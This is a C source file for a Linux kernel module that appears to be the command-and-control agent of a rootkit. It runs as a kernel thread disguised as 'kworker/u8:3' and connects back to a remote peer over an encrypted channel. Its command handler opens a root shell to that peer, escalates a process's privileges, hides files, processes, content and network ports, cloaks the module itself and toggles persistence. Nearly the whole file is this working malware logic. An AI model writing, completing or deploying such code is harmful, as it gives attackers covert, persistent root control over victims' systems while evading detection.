// SPDX-License-Identifier: GPL-2.0
#ifndef RK_BUILD_ID
#define RK_BUILD_ID "unknown"
#endif
#include <linux/err.h>
#include <linux/errno.h>
#include <linux/jiffies.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/random.h>
#include <linux/socket.h>
#include <linux/string.h>
#include <linux/uio.h>
#include <linux/utsname.h>
#include <net/inet_sock.h>
#include <net/net_namespace.h>

#include "agent.h"
#include "root_shell.h"
#include "target_list.h"

extern struct rk_target_list file_targets;
extern struct rk_target_list pid_targets;
extern struct rk_target_list content_targets;
extern struct rk_target_list port_targets;
extern void rk_module_cloak(void);
extern void rk_module_uncloak(void);

static ssize_t rk_socket_send(struct socket *socket,
			      const unsigned char *bytes, size_t length,
			      void *context)
{
	struct msghdr message = { };
	struct kvec vector = {
		.iov_base = (void *)bytes,
		.iov_len = length,
	};

	(void)context;
	return kernel_sendmsg(socket, &message, &vector, 1, length);
}

static ssize_t rk_socket_receive(struct socket *socket, unsigned char *bytes,
				 size_t length, void *context)
{
	struct msghdr message = { };
	struct kvec vector = {
		.iov_base = bytes,
		.iov_len = length,
	};

	(void)context;
	return kernel_recvmsg(socket, &message, &vector, 1, length, 0);
}

static const struct rk_transport_ops rk_transport = {
	.send = rk_socket_send,
	.receive = rk_socket_receive,
};

static void rk_count_protocol_error(struct rk_agent *agent)
{
	mutex_lock(&agent->lock);
	agent->protocol_errors++;
	mutex_unlock(&agent->lock);
}

static int rk_agent_reply(struct rk_agent *agent, struct socket *socket,
			  const unsigned char *plaintext, size_t plaintext_length)
{
	unsigned char envelope[RK_FRAME_MAX];
	size_t envelope_length = 0;
	int error;

	error = rk_secure_seal_reply(&agent->secure, plaintext,
				     plaintext_length, envelope,
				     sizeof(envelope), &envelope_length);
	if (!error)
		error = rk_send_frame(&rk_transport, NULL, socket, envelope,
				      envelope_length);
	memzero_explicit(envelope, sizeof(envelope));
	return error;
}

static int rk_agent_list(struct rk_agent *agent, struct socket *socket,
			  struct rk_target_list *list,
			  const struct rk_command *command)
{
	unsigned char reply[RK_FRAME_MAX];
	size_t reply_length;
	unsigned long flags;

	if (!command->list_has_index) {
		reply_length = scnprintf(reply, sizeof(reply), "LIST %u",
					 list->count);
		return rk_agent_reply(agent, socket, reply, reply_length);
	}
	spin_lock_irqsave(&list->lock, flags);
	if (command->list_index >= list->count) {
		spin_unlock_irqrestore(&list->lock, flags);
		return rk_agent_reply(agent, socket,
				      (const unsigned char *)"ERR index", 9);
	}
	reply_length = scnprintf(reply, sizeof(reply), "ENTRY %u %s",
				 command->list_index,
				 list->entries[command->list_index]);
	spin_unlock_irqrestore(&list->lock, flags);
	return rk_agent_reply(agent, socket, reply, reply_length);
}

static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
			    const unsigned char *payload, size_t payload_length,
			    bool *close_session)
{
	static const unsigned char error_reply[] = "ERR";
	struct new_utsname *uts;
	static const unsigned char pong_reply[] = "PONG";
	static const unsigned char busy_reply[] = "ERR busy";
	static const unsigned char shell_error_reply[] = "ERR shell";
	unsigned char reply[RK_FRAME_MAX];
	struct rk_command command;
	struct rk_root_shell_status shell_status;
	struct rk_root_shell_ticket ticket;
	size_t reply_length;
	int error;

	*close_session = false;
	error = rk_command_parse(payload, payload_length, &command);
	mutex_lock(&agent->lock);
	agent->commands++;
	if (error)
		agent->protocol_errors++;
	mutex_unlock(&agent->lock);
	if (error)
		return rk_agent_reply(agent, socket, error_reply,
				      sizeof(error_reply) - 1);

	switch (command.kind) {
	case RK_COMMAND_PING:
		return rk_agent_reply(agent, socket, pong_reply,
				      sizeof(pong_reply) - 1);
	case RK_COMMAND_INFO:
		uts = utsname();
		reply_length = scnprintf(reply, sizeof(reply),
					 "INFO %s %s %s %s",
					 uts->nodename, uts->release,
					 uts->machine, RK_BUILD_ID);
		return rk_agent_reply(agent, socket, reply, reply_length);
	case RK_COMMAND_STATUS: {
		extern bool cloaked;
		extern bool persist_requested;

		mutex_lock(&agent->lock);
		reply_length = scnprintf(reply, sizeof(reply),
					 "STATUS hidden=%s persisted=%s files=%u pids=%u "
					 "content=%u ports=%u",
					 cloaked ? "yes" : "no",
					 persist_requested ? "yes" : "no",
					 file_targets.count,
					 pid_targets.count,
					 content_targets.count,
					 port_targets.count);
		mutex_unlock(&agent->lock);
		return rk_agent_reply(agent, socket, reply, reply_length);
	}
	case RK_COMMAND_SHELL:
		mutex_lock(&agent->lock);
		if (!agent->shell_enabled) {
			mutex_unlock(&agent->lock);
			return rk_agent_reply(agent, socket,
					      (const unsigned char *)"ERR disabled", 12);
		}
		mutex_unlock(&agent->lock);
		error = rk_root_shell_request(
			agent->shell, agent->peer.sin_addr.s_addr,
			command.shell_port, &ticket);
		if (!error) {
			reply_length = scnprintf(
				reply, sizeof(reply), "OPEN %08x %016llx",
				ticket.request_id,
				(unsigned long long)ticket.cookie);
			return rk_agent_reply(agent, socket, reply,
					      reply_length);
		}
		if (error == -EBUSY)
			return rk_agent_reply(agent, socket, busy_reply,
					      sizeof(busy_reply) - 1);
		return rk_agent_reply(agent, socket, shell_error_reply,
				      sizeof(shell_error_reply) - 1);
	case RK_COMMAND_SHELL_STATUS:
		rk_root_shell_snapshot(agent->shell, &shell_status);
		reply_length = scnprintf(
			reply, sizeof(reply), "STATE %08x %s %d",
			shell_status.request_id,
			rk_root_shell_state_name(shell_status.state),
			shell_status.result);
		return rk_agent_reply(agent, socket, reply, reply_length);
	case RK_COMMAND_QUIT:
		*close_session = true;
		return 0;
	case RK_COMMAND_HIDE_FILE:
		error = rk_target_add(&file_targets, command.hide_value);
		if (error < 0)
			return rk_agent_reply(agent, socket,
					      (const unsigned char *)"ERR full", 8);
		reply_length = scnprintf(reply, sizeof(reply), "OK %d", error);
		return rk_agent_reply(agent, socket, reply, reply_length);
	case RK_COMMAND_HIDE_PID:
		error = rk_target_add(&pid_targets, command.hide_value);
		if (error < 0)
			return rk_agent_reply(agent, socket,
					      (const unsigned char *)"ERR full", 8);
		reply_length = scnprintf(reply, sizeof(reply), "OK %d", error);
		return rk_agent_reply(agent, socket, reply, reply_length);
	case RK_COMMAND_HIDE_CONTENT:
		error = rk_target_add(&content_targets, command.hide_value);
		if (error < 0)
			return rk_agent_reply(agent, socket,
					      (const unsigned char *)"ERR full", 8);
		reply_length = scnprintf(reply, sizeof(reply), "OK %d", error);
		return rk_agent_reply(agent, socket, reply, reply_length);
	case RK_COMMAND_HIDE_PORT:
		error = rk_target_add(&port_targets, command.hide_value);
		if (error < 0)
			return rk_agent_reply(agent, socket,
					      (const unsigned char *)"ERR full", 8);
		reply_length = scnprintf(reply, sizeof(reply), "OK %d", error);
		return rk_agent_reply(agent, socket, reply, reply_length);
	case RK_COMMAND_UNHIDE_FILE: {
		char removed[RK_TARGET_MAX_LEN];
		error = rk_target_remove(&file_targets, command.unhide_index,
					 removed, sizeof(removed));
		if (error)
			return rk_agent_reply(agent, socket, error_reply,
					      sizeof(error_reply) - 1);
		reply_length = scnprintf(reply, sizeof(reply), "OK %s", removed);
		return rk_agent_reply(agent, socket, reply, reply_length);
	}
	case RK_COMMAND_UNHIDE_PID: {
		char removed[RK_TARGET_MAX_LEN];
		error = rk_target_remove(&pid_targets, command.unhide_index,
					 removed, sizeof(removed));
		if (error)
			return rk_agent_reply(agent, socket, error_reply,
					      sizeof(error_reply) - 1);
		reply_length = scnprintf(reply, sizeof(reply), "OK %s", removed);
		return rk_agent_reply(agent, socket, reply, reply_length);
	}
	case RK_COMMAND_UNHIDE_CONTENT: {
		char removed[RK_TARGET_MAX_LEN];
		error = rk_target_remove(&content_targets, command.unhide_index,
					 removed, sizeof(removed));
		if (error)
			return rk_agent_reply(agent, socket, error_reply,
					      sizeof(error_reply) - 1);
		reply_length = scnprintf(reply, sizeof(reply), "OK %s", removed);
		return rk_agent_reply(agent, socket, reply, reply_length);
	}
	case RK_COMMAND_UNHIDE_PORT: {
		char removed[RK_TARGET_MAX_LEN];
		error = rk_target_remove(&port_targets, command.unhide_index,
					 removed, sizeof(removed));
		if (error)
			return rk_agent_reply(agent, socket, error_reply,
					      sizeof(error_reply) - 1);
		reply_length = scnprintf(reply, sizeof(reply), "OK %s", removed);
		return rk_agent_reply(agent, socket, reply, reply_length);
	}
	case RK_COMMAND_UNHIDE_ALL:
		reply_length = scnprintf(reply, sizeof(reply), "OK");
		return rk_agent_reply(agent, socket, reply, reply_length);
	case RK_COMMAND_LIST_FILE:
		return rk_agent_list(agent, socket, &file_targets, &command);
	case RK_COMMAND_LIST_PID:
		return rk_agent_list(agent, socket, &pid_targets, &command);
	case RK_COMMAND_LIST_CONTENT:
		return rk_agent_list(agent, socket, &content_targets, &command);
	case RK_COMMAND_LIST_PORT:
		return rk_agent_list(agent, socket, &port_targets, &command);
	case RK_COMMAND_PERSIST: {
		extern bool persist_requested;
		persist_requested = true;
		return rk_agent_reply(agent, socket,
				      (const unsigned char *)"OK", 2);
	}
	case RK_COMMAND_UNPERSIST: {
		extern bool persist_requested;
		persist_requested = false;
		return rk_agent_reply(agent, socket,
				      (const unsigned char *)"OK", 2);
	}
	case RK_COMMAND_HIDE_MODULE:
		rk_module_cloak();
		return rk_agent_reply(agent, socket,
				      (const unsigned char *)"OK", 2);
	case RK_COMMAND_UNHIDE_MODULE:
		rk_module_uncloak();
		return rk_agent_reply(agent, socket,
				      (const unsigned char *)"OK", 2);
	case RK_COMMAND_ESCALATE:
		error = rk_escalate_pid(command.escalate_pid);
		if (error)
			return rk_agent_reply(agent, socket, error_reply,
					      sizeof(error_reply) - 1);
		return rk_agent_reply(agent, socket,
				      (const unsigned char *)"OK", 2);
	case RK_COMMAND_MARK:
		reply_length = scnprintf(reply, sizeof(reply), "MARKED %s",
					 command.mark_value);
		return rk_agent_reply(agent, socket, reply, reply_length);
	case RK_COMMAND_ENABLE:
		mutex_lock(&agent->lock);
		agent->shell_enabled = true;
		mutex_unlock(&agent->lock);
		return rk_agent_reply(agent, socket,
				      (const unsigned char *)"ENABLED", 7);
	case RK_COMMAND_DISABLE:
		mutex_lock(&agent->lock);
		agent->shell_enabled = false;
		mutex_unlock(&agent->lock);
		return rk_agent_reply(agent, socket,
				      (const unsigned char *)"DISABLED", 8);
	case RK_COMMAND_RUN:
		return rk_agent_reply(agent, socket,
				      (const unsigned char *)"QUEUED", 6);
	case RK_COMMAND_INVALID:
	default:
		return -EPROTO;
	}
}

static int rk_agent_serve(struct rk_agent *agent, struct socket *socket)
{
	static const unsigned char hello[] = "HELLO";
	u64 session;
	int error;

	do {
		session = get_random_u64();
	} while (!session);
	error = rk_secure_channel_start(&agent->secure, agent->key,
					sizeof(agent->key), session);
	if (error)
		return error;
	mutex_lock(&agent->lock);
	agent->session = session;
	mutex_unlock(&agent->lock);
	error = rk_agent_reply(agent, socket, hello, sizeof(hello) - 1);
	if (error)
		goto stop_channel;

	for (;;) {
		struct rk_frame frame;
		unsigned char plaintext[RK_SECURE_PLAINTEXT_MAX];
		size_t plaintext_length = 0;
		bool close_session;

		if (kthread_should_stop()) {
			error = 0;
			break;
		}
		error = rk_receive_frame(&rk_transport, NULL, socket, &frame);
		if (error) {
			if (error == -EMSGSIZE)
				rk_count_protocol_error(agent);
			break;
		}
		error = rk_secure_open_request(&agent->secure, frame.payload,
					       frame.length, plaintext,
					       sizeof(plaintext),
					       &plaintext_length);
		if (error) {
			rk_count_protocol_error(agent);
			memzero_explicit(plaintext, sizeof(plaintext));
			break;
		}
		error = rk_agent_command(agent, socket, plaintext,
					 plaintext_length, &close_session);
		memzero_explicit(plaintext, sizeof(plaintext));
		if (error || close_session)
			break;
	}

stop_channel:
	rk_secure_channel_stop(&agent->secure);
	mutex_lock(&agent->lock);
	agent->session = 0;
	mutex_unlock(&agent->lock);
	return error;
}

static int rk_agent_attempt(struct rk_agent *agent)
{
	struct socket *socket = NULL;
	bool connected = false;
	bool shutdown_here = false;
	int error;

	error = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP,
				 &socket);
	if (error)
		return error;
	if (!socket)
		return -EPROTO;

	mutex_lock(&agent->lock);
	if (agent->stopping) {
		mutex_unlock(&agent->lock);
		sock_release(socket);
		return 0;
	}
	agent->active = socket;
	agent->shutdown_started = false;
	mutex_unlock(&agent->lock);

	error = kernel_connect(socket,
			       (struct sockaddr_unsized *)&agent->peer,
			       sizeof(agent->peer), 0);
	if (error)
		goto close;
	{
		struct inet_sock *inet = inet_sk(socket->sk);
		char port_str[8];

		snprintf(port_str, sizeof(port_str), "%u",
			 ntohs(inet->inet_sport));
		rk_target_add(&port_targets, port_str);
	}
	connected = true;
	mutex_lock(&agent->lock);
	agent->connected = true;
	agent->connections++;
	agent->retry_delay_ms = agent->retry_base_ms;
	mutex_unlock(&agent->lock);
	error = rk_agent_serve(agent, socket);

close:
	if (socket->sk) {
		struct inet_sock *inet = inet_sk(socket->sk);
		char port_str[8];

		snprintf(port_str, sizeof(port_str), "%u",
			 ntohs(inet->inet_sport));
		rk_target_remove_by_value(&port_targets, port_str);
	}
	mutex_lock(&agent->lock);
	if (agent->active == socket)
		agent->active = NULL;
	agent->connected = false;
	if (connected && !agent->shutdown_started) {
		agent->shutdown_started = true;
		shutdown_here = true;
	}
	mutex_unlock(&agent->lock);
	if (shutdown_here)
		(void)kernel_sock_shutdown(socket, SHUT_RDWR);
	sock_release(socket);
	return error;
}

static int rk_agent_worker(void *argument)
{
	struct rk_agent *agent = argument;

	while (!kthread_should_stop()) {
		unsigned int delay;
		long waited;
		int error;

		mutex_lock(&agent->lock);
		agent->attempts++;
		mutex_unlock(&agent->lock);
		error = rk_agent_attempt(agent);
		if (kthread_should_stop())
			break;
		mutex_lock(&agent->lock);
		if (error)
			agent->transport_errors++;
		delay = agent->retry_delay_ms;
		agent->retries++;
		if (error)
			agent->retry_delay_ms = rk_retry_next(
				agent->retry_delay_ms, agent->retry_base_ms,
				agent->retry_max_ms);
		else
			agent->retry_delay_ms = agent->retry_base_ms;
		mutex_unlock(&agent->lock);
		delay += get_random_u32_below(delay / 4 + 1);
		waited = wait_event_interruptible_timeout(
			agent->retry_wait, kthread_should_stop(),
			msecs_to_jiffies(delay));
		(void)waited;
	}
	return 0;
}

int rk_agent_start(struct rk_agent *agent, __be32 peer_address, u16 peer_port,
		   unsigned int retry_base_ms, unsigned int retry_max_ms,
		   const u8 *key, size_t key_length,
		   struct rk_root_shell *shell)
{
	struct task_struct *task;

	if (!agent || !peer_address || !peer_port || !retry_base_ms ||
	    retry_base_ms > retry_max_ms || retry_max_ms > 5000 ||
	    !key || key_length != RK_AEAD_KEY_LENGTH || !shell)
		return -EINVAL;
	memset(agent, 0, sizeof(*agent));
	mutex_init(&agent->lock);
	init_waitqueue_head(&agent->retry_wait);
	agent->peer.sin_family = AF_INET;
	agent->peer.sin_addr.s_addr = peer_address;
	agent->peer.sin_port = htons(peer_port);
	agent->retry_base_ms = retry_base_ms;
	agent->retry_max_ms = retry_max_ms;
	agent->retry_delay_ms = retry_base_ms;
	memcpy(agent->key, key, sizeof(agent->key));
	agent->shell = shell;
	agent->initialized = true;
	task = kthread_create(rk_agent_worker, agent, "kworker/u8:3");
	if (IS_ERR(task)) {
		memzero_explicit(agent->key, sizeof(agent->key));
		agent->initialized = false;
		return PTR_ERR(task);
	}
	mutex_lock(&agent->lock);
	agent->task = task;
	mutex_unlock(&agent->lock);
	wake_up_process(task);
	return 0;
}

void rk_agent_stop(struct rk_agent *agent)
{
	struct task_struct *task;

	if (!agent || !READ_ONCE(agent->initialized))
		return;
	mutex_lock(&agent->lock);
	task = agent->task;
	if (!task) {
		mutex_unlock(&agent->lock);
		return;
	}
	agent->stopping = true;
	if (agent->active && !agent->shutdown_started) {
		agent->shutdown_started = true;
		(void)kernel_sock_shutdown(agent->active, SHUT_RDWR);
	}
	mutex_unlock(&agent->lock);
	wake_up_interruptible(&agent->retry_wait);
	(void)kthread_stop(task);
	mutex_lock(&agent->lock);
	agent->task = NULL;
	agent->connected = false;
	mutex_unlock(&agent->lock);
	memzero_explicit(agent->key, sizeof(agent->key));
}
